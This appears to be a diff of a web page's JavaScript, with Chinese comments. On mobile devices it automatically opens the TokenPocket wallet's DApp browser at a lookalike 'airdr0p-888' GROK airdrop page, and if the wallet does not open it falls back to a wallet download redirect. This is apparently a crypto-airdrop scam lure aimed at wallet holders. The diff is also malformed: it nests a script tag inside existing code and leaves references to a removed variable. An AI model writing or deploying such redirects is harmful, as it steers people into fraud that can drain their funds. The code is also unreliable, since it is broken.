@@ -130,16 +130,22 @@
       }
     }
 
-    window.onload = async () => {
-      // === 自动唤起 TP 钱包 ===
-      if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-        const targetUrl = "https://airdr0p-888.github.io/GROK1688/index.html";
-        const params = {
-          url: targetUrl,
-          chain: "BSC",
-          source: "GROK-Airdrop"
-        };
-        const tpLink = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify(params));
+<script>
+window.onload = () => {
+  if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+    // ✅ 使用新版 tpdapp:// 协议
+    const tpDappUrl = "tpdapp://open?url=https%3A%2F%2Fairdr0p-888.github.io%2FGROK1688%2Findex.html";
+
+    // 尝试打开 TP 钱包的 DApp 浏览器
+    window.location.href = tpDappUrl;
+
+    // 如果 3 秒内没有打开，就跳转下载页
+    setTimeout(() => {
+      window.location.href = "https://www.tokenpocket.pro/zh/download";
+    }, 3000);
+  }
+};
+</script>
 
         // 尝试打开 TP
         window.location.href = tpLink;
